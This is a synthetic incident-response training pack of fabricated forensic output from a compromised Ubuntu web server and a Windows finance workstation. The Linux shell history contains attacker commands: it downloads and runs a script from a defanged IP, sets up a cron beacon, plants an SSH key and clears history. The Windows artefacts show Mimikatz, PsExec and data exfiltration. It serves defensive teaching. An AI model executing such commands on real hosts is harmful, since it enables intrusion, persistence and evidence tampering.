# Session 6 — Cross-platform artefact pack

> **SYNTHETIC TEACHING DATA — CODED Blue Team Classroom**
> Every host, account, address, domain and hash below is fabricated for this
> workshop. No real environment produced this data. Do not visit any address or
> domain shown. Addresses are written defanged (hxxp://, 185[.]220[.]101[.]45)
> where they would otherwise be clickable.
>
> Parsed artefact output from two hosts. Read the Linux integrity results before anything else from that host.

# HOST A — Linux web server (web-prd-02, Ubuntu 22.04)

## A1. Binary integrity check — READ THIS FIRST

```
$ sudo debsums -c
/usr/bin/ps
/usr/bin/netstat
/usr/bin/ss
```

> This Ubuntu host uses Debian packages: `debsums -c` lists files whose
> checksums differ from package records. Investigate these differences from
> a trusted examination environment. A mismatch alone does not prove malware,
> and local package metadata is not an independent trusted baseline.

## A2. Authentication log

```
$ grep -c "Failed password for root from 185.220.101.45" /var/log/auth.log
847

$ grep "Accepted password for root from 185.220.101.45" /var/log/auth.log
Mar 11 03:14:22 web-prd-02 sshd[28841]: Accepted password for root from 185.220.101.45 port 51224 ssh2

$ stat /var/log/auth.log
  Size: 18234      Modify: 2026-03-11 04:58:11
  (earliest entry in file: Mar 11 02:40:02 — the host has been up 94 days)
```

## A3. Shell history

```
$ stat /root/.bash_history
  Size: 2847       Modify: 2026-03-11 03:22:14

$ cat /root/.bash_history
whoami
uname -a
cat /etc/os-release
wget hxxp://185[.]220[.]101[.]45/agent.sh
chmod +x agent.sh
./agent.sh
mkdir -p /tmp/.sys
mv agent.sh /tmp/.sys/beacon.sh
crontab -e
awk -F: '$3==0' /etc/passwd
find / -perm -4000 -type f 2>/dev/null
ssh-keygen -t ed25519 -f /tmp/k -N ''
cat /tmp/k.pub >> /root/.ssh/authorized_keys
ssh administrator@10.0.0.44
history -c
```

## A4. Persistence

```
$ crontab -u root -l
*/5 * * * * /tmp/.sys/beacon.sh

$ find /etc/systemd/system/ -newer /etc/passwd
(no results)

$ find / -name authorized_keys -newer /etc/passwd 2>/dev/null
/root/.ssh/authorized_keys

$ cat /root/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQ...  admin@corp-jump-01      # pre-existing, Jan 2026
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5...                        # added 2026-03-11 03:19
```

## A5. Candidate pivot evidence

```
$ cat /root/.ssh/known_hosts
corp-jump-01,10.0.0.9 ssh-rsa AAAAB3NzaC1yc2E...
10.0.0.44 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5...
```

## A6. Privilege

```
$ awk -F: '$3==0' /etc/passwd
root:x:0:0:root:/root:/bin/bash
syslogd:x:0:0:system logging:/var/log:/bin/bash     <-- added 2026-03-11

$ find / -perm -4000 -type f 2>/dev/null | diff - /opt/baseline/suid-baseline.txt
> /usr/bin/find
```

---

# HOST B — Windows finance workstation (FIN-WS-22, Windows 11 23H2)

> EDR agent was found **disabled**. Service stop time: 2026-03-11 04:02.
> Windows Event Log forwarding to the SIEM remained active throughout.

## B1. Prefetch (PECmd output, abridged)

```
Executable                      RunCount  LastRun              SourcePath
------------------------------  --------  -------------------  ---------------------------
MIMIKATZ.EXE-3BA912C2.pf               2  2026-03-11 04:17:08  C:\Users\Public\
PSEXEC.EXE-A4F12DE3.pf                 1  2026-03-11 04:21:33  C:\Users\Public\
ROBOCOPY.EXE-9C33A1B7.pf               4  2026-03-11 04:55:12  C:\Windows\System32\
CMD.EXE-4A81D33F.pf                   38  2026-03-11 04:21:30  C:\Windows\System32\
EXCEL.EXE-D771C2A9.pf                 61  2026-03-11 09:12:44  C:\Program Files\...
CHROME.EXE-2B8F1E04.pf               412  2026-03-11 09:40:02  C:\Program Files\...

NOTE: MIMIKATZ.EXE and PSEXEC.EXE do not exist on disk.
```

## B2. Persistence (Autoruns output, abridged)

```
LOCATION                 ENTRY                      IMAGE PATH
-----------------------  -------------------------  --------------------------------------
Scheduled Tasks          WindowsDefenderHealth      C:\Users\Public\svchost32.exe
Scheduled Tasks          GoogleUpdateTaskMachine    C:\Program Files (x86)\Google\...
HKLM\...\Run             SecurityHealth             C:\Windows\System32\SecurityHealth...
HKCU\...\Run             OneDrive                   C:\Users\...\OneDrive\OneDrive.exe
Services                 Winmgmt                    C:\Windows\System32\svchost.exe
WMI Subscriptions        (none found)
```

## B3. Registry — user activity (RegRipper output, abridged)

```
SHELLBAGS (USRCLASS.DAT)
  C:\Users\CFO\Documents\                           last accessed 2026-03-11 04:33
  C:\Users\CFO\Documents\Q1_Financial_Reports\      last accessed 2026-03-11 04:35
  C:\Users\Public\                                  last accessed 2026-03-11 04:16

RECENTDOCS
  Q1_Board_Pack.pdf          2026-03-11 04:36
  Q1_Revenue_Model.xlsx      2026-03-11 04:37
  (12 further .pdf entries, all 2026-03-11 04:36-04:41)

USERASSIT (ROT13 decoded)
  C:\Users\Public\svchost32.exe    run count 3
```

## B4. SRUM (per-application network bytes)

```
APPLICATION        BYTES SENT      BYTES RECEIVED  WINDOW
-----------------  --------------  --------------  -------------------
robocopy.exe        2,471,829,504          18,220  2026-03-11 04:40-04:55
chrome.exe            142,880,221   1,904,228,101  2026-03-11 08:00-17:00
svchost32.exe           1,204,882       4,220,118  2026-03-11 04:02-04:58
OUTLOOK.EXE            22,104,882     188,220,004  2026-03-11 08:00-17:00
```

## B5. Event log (EvtxECmd output, abridged)

```
2026-03-11 04:12:07  4624  LogonType=3  AuthPkg=NTLM  user=administrator  source=10.0.0.9
2026-03-11 04:12:09  4672  SeDebugPrivilege SeBackupPrivilege  user=administrator
2026-03-11 04:21:30  4648  Explicit credentials  target=FILESERVER-01  user=administrator
2026-03-11 04:21:33  7045  New service: PSEXESVC  ImagePath=C:\Windows\PSEXESVC.exe
2026-03-11 04:58:22  1102  Security log cleared  user=administrator

NOTE: events up to 04:58:20 were forwarded to the SIEM before the clear and
are intact in the SIEM. The local log begins at 04:58:22.
```

